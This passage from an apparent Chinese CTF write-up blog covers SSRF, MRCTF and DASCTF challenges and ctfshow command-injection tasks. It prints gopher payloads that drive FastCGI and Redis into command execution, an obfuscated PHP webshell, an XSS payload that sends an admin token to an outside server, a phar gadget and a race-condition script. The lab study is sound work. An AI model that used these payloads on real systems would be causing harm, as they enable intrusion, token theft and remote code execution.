http:&#x2F;&#x2F;challenge-5da7279b1e83a566.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%251BSCRIPT_FILENAME%2Fusr%2Flocal%2Flib%2Fphp%2FPEAR.php%250D%2501DOCUMENT_ROOT%2F%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_52cc1357979c158b0cb02c8ff00b83b1%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500 方法二： https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 p牛的脚本fpm.py 开两个终端，一个监听自己的9000端口 另一个执行脚本 命令：python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件] python3 fpm.py 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -c &quot;&lt;?php system(&#39;ls&#39;);?&gt;&quot; 得到exp.txt 进行url编码 #python2 from urllib import quote f &#x3D; open(&#39;D:\\Desktop\\exp.txt&#39;) ff &#x3D; f.read() print(&#39;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_&#39;+quote(ff)) #gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%E8u%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E8u%01%DB%00%00%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B %17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0C%00QUERY_STRING%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985% 0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%10CONTENT_TYPEapplication&#x2F;text%0E%02CONTENT_LENGTH21%09%1FPHP_VALUEauto_prepend_file%20%3D%20ph p%3A&#x2F;&#x2F;input%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%01%04%E8u%00%00%00%00%01%05%E8u%00%15%00%00%3C%3Fphp%20system%28%27ls%27%29%3B%3F%3E%01%05%E8u%00%00%00%00 再对得到的结果进行再次编码 http:&#x2F;&#x2F;challenge-1c4d6ae123d715b8.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%25E8u%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25E8u%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI%2F1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250B%2517SCRIPT_NAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%250F%250ESERVER_SOFTWAREphp%2Ffcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250C%2510CONTENT_TYPEapplication%2Ftext%250E%2502CONTENT_LENGTH21%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%25E8u%2500%2500%2500%2500%2501%2505%25E8u%2500%2515%2500%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253B%253F%253E%2501%2505%25E8u%2500%2500%2500%2500 成功读到了文件，后边就是ls /然后cat /flag的操作了 看到有wp用的写一句话木马的方式，然后蚁剑连接，但是我没复现成功 https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1 redis协议直接上gopherus 这里如果php payload按默认的来的话应该是一个以cmd为密码的一句话木马 url&#x3D;gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_%252A%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A 同样是再编码一次然后上传，之后访问shell.php就能看见结果了 URL Bypass 要求必须有http://notfound.ctfhub.com 可以利用@来绕过 http:&#x2F;&#x2F;challenge-eb34acd716115c01.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php 数字IP Bypassban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1 0.0.0.0 localhost 还有本地回环的其他表示方法 http://[::ffff:7f00:1] http://0:80 ip十六进制 ip八进制 顺带一提这个正则匹配的过滤，好像还过滤了http://和/flag.php之间的点，但是你只要去了前边的http://就能绕过了 ip十进制 302跳转 Bypass感觉题目环境有点问题，利用短链接并不能实现跳转，只能file协议读一下源码 然后localhost或者0.0.0.0就过了 对不起，我道歉，不是环境的问题，是国内的那些短链接生成网站的问题。。。 用这个https://tinyurl.com/app/ DNS重绑定 Bypass浅谈DNS重绑定漏洞 - 知乎 (zhihu.com) DNS Rebinding 在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。 具体步骤 攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network 攻击者通过一些方式诱导受害者加载http://rebind.network 用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址 恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效 从http://rebind.network加载的网页包含恶意的js代码,构造恶意的请求到http://rebind.network/index,而受害者的浏览器便在执行恶意请求 一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让http://rebind.network绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果 同源策略的失效 对于WEB的同源策略相信大家都很熟悉,如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。 当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。 同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略. https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg 在这个网站设置 然后访问就行了，如果没有的话多刷新几次，因为生成的主机名将随机解析为使用非常低的 ttl 指定的地址之一。","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ssrf","slug":"ssrf","permalink":"https://ethe448.github.io/tags/ssrf/"}]},{"title":"2022MRCTF复现","slug":"2022MRCTF复现","date":"2022-04-25T12:52:32.000Z","updated":"2022-05-27T11:55:44.646Z","comments":true,"path":"2022/04/25/2022MRCTF复现/","link":"","permalink":"https://ethe448.github.io/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"我太菜了，只能靠看别人的wp来复现过日子了 WebCheckIn好骚的思路，从来没有想过能这样 一个只能传php文件的文件上传，但是检测到一些命令执行或者其他的内容就会报错。 方法一 r4kapig的wp里的方式，利用new ERROR(1);来抛出错误 但是事实上这应该是这道题的后端用来过滤上传的php文件里的内容的代码导致的，这个检测感觉有点神奇。利用new一个类之后后边不管是什么都能传上去，只不过只有new一个php的基类时上传的php文件才不会因为报错而导致停止执行。也就是说，这里随便new一个基类就行 然后执行grep命令找flag就行 方法二 这是wm的wp里的方法 一个靠构造CHR以及动态拼接特性构造出的一个很离谱的webshell &lt;?php (((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^((.999999999999999).(.999999999999999))).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(9)))))($_POST[1]) ?&gt; God_of_GPA先注册个账号，然后登录 我们可以看到这里有token，这应该是负责认证用户身份的。 登录之后在查看成绩里有个只有管理员才能看的按钮，而且我们还可以发垃圾话，然后将id提交给管理员让他看。这道题就是让我们利用xss来获取管理员的token来得到flag &lt;div id=\"scrip\"> console.log(\"injected\"); let uri = window.location.href + \"\"; if (uri.indexOf('token') > -1)&#123; location.href=\"//服务器ip/flag?f=\"+encodeURIComponent(uri) &#125;else&#123; location.href=\"http://brtserver.node3.mrctf.fun/oauth/authorize?redirect_uri=\"+window.location.href &#125; &lt;/div> &lt;img src='data:,\"onerror=\"eval(scrip.innerText)' id=\"MyImg\" /> 然后我们将uuid提交给管理员 就可以在服务器的日志里找到管理员的token 回到login路径下把token换掉就行了 这里xss的利用好像主要是Dom Clobbering技术来触发的dom型xss （说起来因为dom型xss利用的少，我还是第一次见 使用 Dom Clobbering 扩展 XSS - 先知社区 (aliyun.com) 附一个出题人写的 MRCTF2022_God_of_GPA_WP - Welcome to fallingblog (ibukifalling.github.io) 发现好像只有这两个能复现。。。其他的都是Java安全了，放一下y4师傅的java题的wp，以后学会Java之后再看 2022MRCTF-Java部分 | Y4tacker&#39;s Blog","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"2022DASCTF Apr复现","slug":"2022DASCTF-Apr复现","date":"2022-04-24T13:43:49.000Z","updated":"2022-04-25T12:57:40.212Z","comments":true,"path":"2022/04/24/2022DASCTF-Apr复现/","link":"","permalink":"https://ethe448.github.io/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"纯复现了，没打 Misc当时就看了看这一个misc，觉得应该是有文件，但是没提出来 SimpleFlow一道流量分析题，用wireshark打开，然后追踪一下tcp流，看起来想是蚁剑的流量特征，在第52流看到了flag的zip 变成原始数据 很明显的504b的zip文件头，复制出来放010里另存为拿到zip文件，但是需要密码，再看看第50流 url解码后 我们直接找m8f8d9db647ecd对应的值，然后把它base64解码 但是还是没有找到密码，而我们发现url解码后的数据还有其他的参数，但是并不能直接base64解码，这是因为传参之后被substr去掉了前面两位 所以我们可以去掉前两位之后再解码，在g479cf6f058cf8对应的Y2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0Ijt6aXAgLVAgUGFTc1ppUFdvckQgZmxhZy56aXAgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd中得到我们的密码 PaSsZiPWorD 解压缩，拿到flag webwarmup-php这题看起来很麻烦，但是如果自己一步一步调试，还是很好出的 &lt;?php spl_autoload_register(function($class)&#123; require(&quot;.&#x2F;class&#x2F;&quot;.$class.&quot;.php&quot;); &#125;); highlight_file(__FILE__); error_reporting(0); $action &#x3D; $_GET[&#39;action&#39;]; $properties &#x3D; $_POST[&#39;properties&#39;]; class Action&#123; public function __construct($action,$properties)&#123; $object&#x3D;new $action(); foreach($properties as $name&#x3D;&gt;$value) $object-&gt;$name&#x3D;$value; $object-&gt;run(); &#125; &#125; new Action($action,$properties); ?&gt; 先看第一段，action是类名，properties的key是属性，value是值 所以我们的赋值就要依靠properties 然后调用action定义的类里的run方法 run方法在ListView.php里 &lt;?php class ListView &#123; public $tagName&#x3D;&#39;div&#39;; public $template &#x3D; &#39;flag&#39;; public function run() &#123; echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; $this-&gt;renderContent(); echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; &#125; public function renderContent() &#123; ob_start(); echo preg_replace_callback(&quot;&#x2F;&#123;(\\w+)&#125;&#x2F;&quot;,array($this,&#39;renderSection&#39;),$this-&gt;template); ob_end_flush(); &#125; protected function renderSection($matches) &#123; $method&#x3D;&#39;render&#39;.$matches[1]; if(method_exists($this,$method)) &#123; $this-&gt;$method(); $html&#x3D;ob_get_contents(); ob_clean(); return $html; &#125; else return $matches[0]; &#125; &#125; run-&gt;renderContent-&gt;renderSection 在renderContent中利用preg_replace_callback对template中的值进行了正则匹配，如果匹配到{\\w+}就调用renderSection，而将匹配到的结果进行参数传入renderSection，而在renderSection中将$matches[1]与render进行了一个拼接，并检测是否有这个方法，有就去执行它。 我们可以调试一下看看匹配到的参数matches是什么形式的 经过调试我们发现，如果template是{TableBody}，那么经过renderSection，就会调用TestView里的renderTableBody方法 &lt;?php class TestView extends ListView &#123; const FILTER_POS_HEADER&#x3D;&#39;header&#39;; const FILTER_POS_BODY&#x3D;&#39;body&#39;; public $columns&#x3D;array(); public $rowCssClass&#x3D;array(&#39;odd&#39;,&#39;even&#39;); public $rowCssClassExpression; public $rowHtmlOptionsExpression; public $selectableRows&#x3D;1; public $data&#x3D;array(1,2,3); public $filterSelector&#x3D;&#39;&#123;filter&#125;&#39;; public $filterCssClass&#x3D;&#39;filters&#39;; public $filterPosition&#x3D;&#39;body&#39;; public $filter; public $hideHeader&#x3D;false; public function renderTableHeader() &#123; if(!$this-&gt;hideHeader) &#123; echo &quot;&lt;thead&gt;\\n&quot;; if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER) $this-&gt;renderFilter(); if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY) $this-&gt;renderFilter(); echo &quot;&lt;&#x2F;thead&gt;\\n&quot;; &#125; elseif($this-&gt;filter!&#x3D;&#x3D;null &amp;&amp; ($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER || $this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY)) &#123; echo &quot;&lt;thead&gt;\\n&quot;; $this-&gt;renderFilter(); echo &quot;&lt;&#x2F;thead&gt;\\n&quot;; &#125; &#125; public function renderFilter() &#123; if($this-&gt;filter!&#x3D;&#x3D;null) &#123; echo &quot;&lt;tr class&#x3D;\\&quot;&#123;$this-&gt;filterCssClass&#125;\\&quot;&gt;\\n&quot;; echo &quot;&lt;&#x2F;tr&gt;\\n&quot;; &#125; &#125; public function renderTableRow($row) &#123; $htmlOptions&#x3D;array(); if($this-&gt;rowHtmlOptionsExpression!&#x3D;&#x3D;null) &#123; $data&#x3D;$this-&gt;data[$row]; $options&#x3D;$this-&gt;evaluateExpression($this-&gt;rowHtmlOptionsExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data)); if(is_array($options)) $htmlOptions &#x3D; $options; &#125; if($this-&gt;rowCssClassExpression!&#x3D;&#x3D;null) &#123; $data&#x3D;$this-&gt;dataProvider-&gt;data[$row]; $class&#x3D;$this-&gt;evaluateExpression($this-&gt;rowCssClassExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data)); &#125; elseif(is_array($this-&gt;rowCssClass) &amp;&amp; ($n&#x3D;count($this-&gt;rowCssClass))&gt;0) $class&#x3D;$this-&gt;rowCssClass[$row%$n]; if(!empty($class)) &#123; if(isset($htmlOptions[&#39;class&#39;])) $htmlOptions[&#39;class&#39;].&#x3D;&#39; &#39;.$class; else $htmlOptions[&#39;class&#39;]&#x3D;$class; &#125; &#125; public function renderTableBody() &#123; $data&#x3D;$this-&gt;data; $n&#x3D;count($data); echo &quot;&lt;tbody&gt;\\n&quot;; if($n&gt;0) &#123; for($row&#x3D;0;$row&lt;$n;++$row) $this-&gt;renderTableRow($row); &#125; else &#123; echo &#39;&lt;tr&gt;&lt;td colspan&#x3D;&quot;&#39;.count($this-&gt;columns).&#39;&quot; class&#x3D;&quot;empty&quot;&gt;&#39;; echo &quot;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;\\n&quot;; &#125; echo &quot;&lt;&#x2F;tbody&gt;\\n&quot;; &#125; &#125; renderTableBody-&gt;renderTableRow-&gt;evaluateExpression而我们的目的就是调用evaluateExpression里的eval来命令执行 public function evaluateExpression($_expression_,$_data_&#x3D;array()) &#123; if(is_string($_expression_)) &#123; extract($_data_); return eval(&#39;return &#39;.$_expression_.&#39;;&#39;); &#125; else &#123; $_data_[]&#x3D;$this; return call_user_func_array($_expression_, $_data_); &#125; &#125; 要想从renderTableBody到renderTableRow，就要给data赋值，让它不为空 要想从renderTableRow到evaluateExpression，就要给renderTableRow赋值，让它不为空，而这个值会直接传给evaluateExpression中的eval来执行命令。 最终payload 这里是TestView而不是ListView应该是因为继承的问题，子类可以调用父类的方法 soeasy_php 源码里有个注释的更换头像的按钮，把注释去掉抓一下包 这里存在两个参数，经过测试发现png这里有任意文件读取 要用绝对路径，相对路径访问的时候会404 edit.php &lt;?php ini_set(&quot;error_reporting&quot;,&quot;0&quot;); class flag&#123; public function copyflag()&#123; exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;以root权限复制&#x2F;flag 到 &#x2F;tmp&#x2F;flag.txt，并chown www-data:www-data &#x2F;tmp&#x2F;flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125; &#125; function filewrite($file,$data)&#123; unlink($file); file_put_contents($file, $data); &#125; if(isset($_POST[&#39;png&#39;]))&#123; $filename &#x3D; $_POST[&#39;png&#39;]; if(!preg_match(&quot;&#x2F;:|phar|\\&#x2F;\\&#x2F;|php&#x2F;im&quot;,$filename))&#123; $f &#x3D; fopen($filename,&quot;r&quot;); $contents &#x3D; fread($f, filesize($filename)); if(strpos($contents,&quot;flag&#123;&quot;) !&#x3D;&#x3D; false)&#123; filewrite($filename,&quot;Don&#39;t give me flag!!!&quot;); &#125; &#125; if(isset($_POST[&#39;flag&#39;])) &#123; $flag &#x3D; (string)$_POST[&#39;flag&#39;]; if ($flag &#x3D;&#x3D; &quot;Give me flag&quot;) &#123; filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, &quot;Don&#39;t give me flag&quot;); sleep(2); die(&quot;no no no !&quot;); &#125; else &#123; filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, $flag); &#x2F;&#x2F;不给我看我自己写个flag。 &#125; $head &#x3D; &quot;uploads&#x2F;head.png&quot;; unlink($head); if (symlink($filename, $head)) &#123; echo &quot;成功更换头像&quot;; &#125; else &#123; unlink($filename); echo &quot;非正常文件，已被删除&quot;; &#125;; &#125; &#125; 看到__destruct这种魔术方法和preg_match里的phar就感觉像一个phar反序列化 class flag&#123; public function copyflag()&#123; exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;以root权限复制&#x2F;flag 到 &#x2F;tmp&#x2F;flag.txt，并chown www-data:www-data &#x2F;tmp&#x2F;flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125; &#125; $a &#x3D; new flag(); $phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的 $phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); 然后是条件竞争， from time import sleep import requests import threading req &#x3D; requests.session() url1 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;uploads&#x2F;head.png&#39; url2 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;edit.php&#39; data1 &#x3D; &#123; &#39;png&#39;: &#39;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;91fd0f2420aed857ed981856761afac6.png&#39;, &#39;flag&#39;: &#39;&#39; &#125; data2 &#x3D; &#123; &#39;png&#39;: &#39;&#x2F;tmp&#x2F;flag.txt&#39;, &#39;flag&#39;: &#39;&#39; &#125; def unlink(): req.post(url2, data1) def symlink(): req.post(url2, data2) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: for _ in range(10): t1 &#x3D; threading.Thread(target&#x3D;unlink, args&#x3D;()) t2 &#x3D; threading.Thread(target&#x3D;symlink, args&#x3D;()) t1.start() t2.start() while True: # getflag flag &#x3D; req.get(url1).text if &quot;flag&quot; in flag: print(flag) break elif &#39;429&#39; in flag: sleep(5) print(&#39;wait!&#39;) 条件竞争这东西。。。感觉挺玄学的 warmup-javajava还没学，而且也没找到wp，先留个坑 cryptoeasy_real简单的rsa import random import hashlib flag &#x3D; &#39;xxxxxxxxxxxxxxxxxxxx&#39; key &#x3D; random.randint(1,10) for i in range(len(flag)): crypto +&#x3D; chr(ord(flag[i])^key) m &#x3D; crypto的ascii十六进制 e &#x3D; random.randint(1,100) print(hashlib.md5(e)) p &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319 q &#x3D; xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx n &#x3D; p*q c &#x3D; pow(m,e,n) print(n) print(c) #37693cfc748049e45d87b8c7d8b9aacd #4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523 #c&#x3D;3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397 已知p，n，c和e的md5值 爆破一下得到e=23 import hashlib for i in range(1,1000000000): res &#x3D; hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest() if res &#x3D;&#x3D; &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;: print(str(i)) print(res) c=3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397p=64310413306776406422334034047152581900365687374336418863191177338901198608319q=65267138038038699886916162739434586079731613825212388229424706115289974540917e=23 然后直接抄个rsa的脚本改改就行 import libnum from Crypto.Util.number import long_to_bytes c &#x3D; 3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397 n &#x3D; 4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523 # n &#x3D; int(&quot;&quot;,16) e &#x3D; 23 # e &#x3D; int(&quot;&quot;,16) q &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319 p &#x3D; 65267138038038699886916162739434586079731613825212388229424706115289974540917 d &#x3D; libnum.invmod(e, (p - 1) * (q - 1)) m &#x3D; pow(c, d, n) # m 的十进制形式 crypto &#x3D; long_to_bytes(m) # m明文 print(crypto.decode(&#39;utf-8&#39;)) # key &#x3D; random.randint(0,11) # for i in range(len(crypto)): # string +&#x3D; chr(ord(crypto[i])^key) for key in range(1,10): print(&#39;&#39;) for i in range(len(crypto)): print(chr(crypto[i]^key),end&#x3D;&#39;&#39;)","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"ctfshow web","slug":"ctfshow web","date":"2022-04-24T07:58:32.000Z","updated":"2023-03-25T07:49:16.354Z","comments":true,"path":"2022/04/24/ctfshow web/","link":"","permalink":"https://ethe448.github.io/2022/04/24/ctfshow%20web/","excerpt":"","text":"命令执行web29&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;system(ls); ?c&#x3D;system(&#39;cat f?ag.php&#39;);&#x2F;&#x2F;通配符直接绕 web30&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;echo &#96;ls&#96;; ?c&#x3D;echo &#96;cat f*&#96;;&#x2F;&#x2F;反引号内联执行 web31&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\\.| |\\&#39;&#x2F;i&quot;, $c))&#123; eval($c); 